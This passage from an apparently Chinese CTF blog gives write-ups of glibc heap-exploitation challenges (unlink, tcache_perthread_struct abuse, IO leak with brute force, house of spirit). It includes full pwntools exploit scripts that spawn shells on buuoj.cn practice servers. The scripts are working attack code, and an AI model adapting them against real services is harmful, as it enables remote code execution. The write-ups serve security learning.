        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token comment"># debug()</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'bbbb'</span><span class="token punctuation">)</span><span class="token comment">#触发unlink</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#进入fastbin</span>
<span class="token comment">#触发malloc_consolidate，fastbin中进入unsortbin中，并因为申请的chunk大于chunk1，chunk1进入smallbin</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'cccc'</span><span class="token punctuation">)</span>
flag_huge <span class="token operator">=</span> <span class="token number">1</span>

<span class="token comment">#触发double free，因为fastbindouble free的检查只检查了fastbin中前一个chunk，smallbin不检查</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
ptr_small <span class="token operator">=</span> <span class="token number">0x6020D0</span>
flag_small<span class="token operator">=</span><span class="token number">0x6020E0</span>
ptr_big <span class="token operator">=</span> <span class="token number">0x6020C0</span>
flag_big<span class="token operator">=</span><span class="token number">0x6020D8</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr_small<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr_small<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#unsortbin大小，触发unlink</span>

free_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>
atoi_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>
puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token comment"># debug()</span>

payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>atoi_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeaf</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_got<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span>

edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#binsh写入ptr，同时修改了free_go</span>

delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x36e80</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># pause()</span>

delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="25-BUU-sctf-2019-one-heap-tcache-perthread-struct利用，IOleak，爆破"><a href="#25-BUU-sctf-2019-one-heap-tcache-perthread-struct利用，IOleak，爆破" class="headerlink" title="25.BUU sctf_2019_one_heap(tcache_perthread_struct利用，IOleak，爆破)"></a>25.BUU sctf_2019_one_heap(tcache_perthread_struct利用，IOleak，爆破)</h2><p>一道2.27下的题目，不算难，只是因为需要爆破两个地方，所以1/256的正确率，挺看脸，不然爆半天都出不来，题目很简单，只有add和delete，add可以有16次，delete只能delete4次：</p>
<p><img src="https://picx.zhimg.com/80/v2-2c053577ce9fed18a2b816c2fd928304_1440w.png?source=d16d100b" alt="img"></p>
<p>delete存在一个double free</p>
<p><img src="https://pic1.zhimg.com/80/v2-fb8f376f63d34edde4ee8d0381738b98_1440w.png?source=d16d100b" alt="img"></p>
<p>思考思路，没有show和edit，想要泄露libc地址，可以使用的方法是打IO Leak，且这道题目的chunk大小限制在fastbin大小，我们无法正常进入unsortbin，从而修改其后四位来得到_IO_2_1_stdout_，所以我们需要用到tcache_perthread_struct,因为如果这里被释放就可以进入unsortbin了。</p>
<p>首先利用double free来得到 tcache_perthread_struct，这里是需要爆破一位的，我这里是在本地关了ASLR，便于调试，</p>
<p><img src="https://picx.zhimg.com/80/v2-6e935ccb0f42b73362dd53b7ea9f123d_1440w.png?source=d16d100b" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-2d7fecc5f5574b4807254d85db8a681c_1440w.png?source=d16d100b" alt="img"></p>
<p>因为tcache_perthread_struct的大小是0x250，且我们现在可以控制他，我们就修改0x250的tcachel链的数量，大于7即可，再释放tcache_perthread_struct，就进入unsortbin了</p>
<p><img src="https://picx.zhimg.com/80/v2-edb0953ecf39bdb4057015e1170186e6_1440w.png?source=d16d100b" alt="img"></p>
<p>接下来我们就要打_IO_2_1_stdout_了，可以看到这里有5位不同（但在正常开启ASLR的话只会有一位不同，只用爆破一位，就是dd0这里的0），我们通过申请合适大小的chunk来切割unsortbin，让main_arena+96滞留在适合的entries 指针位置，这里停留在了0x40大小处，再申请一个0x10大小的chunk（不能大，会影响后面），我们就可以修改停留在0x40大小处的main_arena+96了（这里申请多少需要注意，不能申请的chunk大小里已经有main_arena+96了，这样就会直接从fastbin中取出他，而不是切割unsortbin了）</p>
<p><img src="https://pic1.zhimg.com/80/v2-c8a39b919cb680b14417dbe48640313a_1440w.png?source=d16d100b" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-69937e4faca0167ec00f23fa5999220c_1440w.png?source=d16d100b" alt="img"></p>
<p> 接下来就是打IOleak，然后打free_hook就好了，有一个小地方要注意，最后free_hook也是通过切割unsortbin留在fastbin大小中的，所以前面不能切太多，不然就取不到free_hook了：</p>
<p><img src="https://picx.zhimg.com/80/v2-a6b671bccaa5a8504bca1b8643ec396a_1440w.png?source=d16d100b" alt="img"></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>param<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>param<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice:'</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'size:'</span>
add_content_words <span class="token operator">=</span> <span class="token string">'content:'</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_show <span class="token operator">=</span> <span class="token number">33</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">44</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># debug()</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#爆破1位 堆地址</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x251</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">b'c'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span><span class="token comment">#main_arena+96落在0x40</span>

    <span class="token comment"># add(size=0x10,content=b'\x60\x07\xdd')#调试用 _IO_2_1_stdout_</span>

    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x60\x97'</span><span class="token punctuation">)</span><span class="token comment">#爆破1位 _IO_2_1_stdout</span>
    <span class="token comment"># pause()</span>
    payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">b'\x00'</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">,</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment">#修改_IO_2_1_stdout_</span>
    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    libc<span class="token punctuation">.</span>address<span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ed8b0</span>
    <span class="token keyword">if</span> libc<span class="token punctuation">.</span>address<span class="token operator">&amp;</span><span class="token number">0xfff</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment"># libc.address = u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x3ed8b0</span>
    leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

    <span class="token comment"># one_gadgets=[0x4f2be,0x4f2c5,0x4f322,0x10a38c]</span>
    <span class="token comment"># malloc_hook = libc.sym['__malloc_hook']</span>
    <span class="token comment"># realloc_hook = libc.sym['__realloc_hook']</span>
    free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    system<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#修改main_arena+96为malloc_hook</span>

    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># sh=process(filename)</span>
        sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29044</span><span class="token punctuation">)</span>
        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span>
<span class="token comment"># pwn()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>脸黑远程爆了很久，泪目</p>
<h2 id="26-TFC-CTF-MCBACK2DABASICS-house-of-spirit，IO-Leak，realloc调整栈帧，glibc源码调试"><a href="#26-TFC-CTF-MCBACK2DABASICS-house-of-spirit，IO-Leak，realloc调整栈帧，glibc源码调试" class="headerlink" title="26.TFC CTF MCBACK2DABASICS(house_of_spirit，IO Leak，realloc调整栈帧，glibc源码调试)"></a>26.TFC CTF MCBACK2DABASICS(house_of_spirit，IO Leak，realloc调整栈帧，glibc源码调试)</h2><p>又是一道no leak堆，做完了回头看感觉很简单，但做的却磕磕跘跘，记录一下。</p>
<p>glibc2.24下的64位堆题目，保护全开，菜单题，只有add，delete</p>
<p><img src="https://pica.zhimg.com/80/v2-c51975baa2f51e6a84ef833e0ee81735_1440w.png?source=d16d100b" alt="img"></p>
<p>add里size不能大于0x70，且malloc的时候的size是会是输入的加一的，稍微注意一下，且会在ptr+size的位置写一个0，但这不会影响我们的partial overwrite</p>
<p><img src="https://pica.zhimg.com/80/v2-b01e610700930f18a295b1cec296c80e_1440w.png?source=d16d100b" alt="img"></p>
<p>delete，存在double free漏洞，</p>
<p><img src="https://picx.zhimg.com/80/v2-a7758f1ce7b32bd093d39a3eb152db57_1440w.png?source=d16d100b" alt="img"></p>
<p>那么分析这道题目该怎么做，因为没有show，所以我们还是需要打stdout来泄露libc地址，这就需要用到unsortedbin，但这道题目的限制让我们无法直接获得unsortedbin大小的chunk，所以我们需要想怎么做，没想出来，后来问了才知道是通过double free来改chunk的size，真是纱布，这都想不到，构造fakechunk，将其链入fastbin，修改后面相邻的chunk 的size，满足unsortedbin大小，有了unsortedbin，就有main_arean了，就可以打stdout了，但这里因为是2.24，所以我们需要利用fastbin的double free，找到_IO_2_1_stdout_的fakechunk，将其链入fastbin，就可以得到libc地址了，后面就可以打了，本来是想打free_hook的，但找free_hook的fakechunk时发现，在将其从fastbin中取出时，fakechunk的size位变成0了，很奇怪，所以选择用malloc_hook打one_gadgets，发现都不满足，所以用realloc调整栈帧，就可以成功getshell了。</p>
<p>思路很简单，但却遇到了不少问题，比如调整chunk的size让堆空间不要corrupt了啥的。记录一下比较重要的过程和一些在题里用到的东西，怎么在调试时看glibc源码，realloc怎么调整栈帧。</p>
<p>先构造出一个0x51的fakechunk，并doublefree，再add出chunk0，修改fd指针，指向fakechunk，</p>
<p><img src="https://pica.zhimg.com/80/v2-06764f01810c04f8fbc7810c64da5dcf_1440w.png?source=d16d100b" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-bcd99d3cfe509aac10cb1c3b9299c6a2_1440w.png?source=d16d100b" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-a00703f249aee18377de96e61199ecf0_1440w.png?source=d16d100b" alt="img"></p>
<p>修改下一个chunk的size为unsortedbin大小，且注意与topchunk的距离，防止corrupt，这里修改为0xb1，再将这个chunk释放，就进入了unsortedbin，找到<code>_IO_2_1_stdout_ </code>的fakechunk</p>
<p><img src="https://picx.zhimg.com/80/v2-68e61a490a3db48e39e60f13c93e026d_1440w.png?source=d16d100b" alt="img"></p>
<p>从unsortedbin中切割，还是要注意不要corrupt了，切割好后修改(main_arena+88)的后两字节，使其指向fakechunk（<strong>当然，真做的时候还是要爆破</strong>）。接下来要考虑怎么把fakechunk加入fastbin中了，还是像刚刚改size一样，使用double free，然后修改fd指针，指向存着fakechunk的chunk，注意chunk的大小，因为fakechunk的size是0x7f，所以在0x70大小的fastbin链中（不知道怎么想的，一直想的是size是0x7f是在0x80中的，导致一直出错，还是调了glibc源码才发现错误的）这里记录一下怎么调的glibc源码，其实很简单，先下好glibc源码，在gdb启动后dir要调试的文件夹，比如这里要调malloc，就dir ~/glibc/glibc2.24/malloc,再下断点就好了，就可以看到source code在运行中的情况了，还可以p idx啥的查看变量值</p>
<p><img src="https://pica.zhimg.com/80/v2-6426a139ea2e35e2cdbb0008f6ada0d6_1440w.png?source=d16d100b" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-11ab2d4bbc59f9f3a67d57369d946692_1440w.png?source=d16d100b" alt="img"></p>
